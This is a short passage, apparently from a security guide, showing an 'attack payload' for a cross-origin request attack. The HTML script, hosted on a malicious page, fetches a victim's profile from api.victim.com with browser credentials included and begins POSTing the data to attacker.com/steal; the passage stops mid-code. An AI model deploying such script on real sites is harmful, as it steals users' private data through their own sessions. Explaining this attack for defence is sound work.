**Attack Payload** (run from a malicious website like `https://evil.example`):
```html
<script>
fetch('https://api.victim.com/profile', {
  credentials: 'include' // browser sends cookies / Authorization header
})
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/steal', {
      method: 'POST',
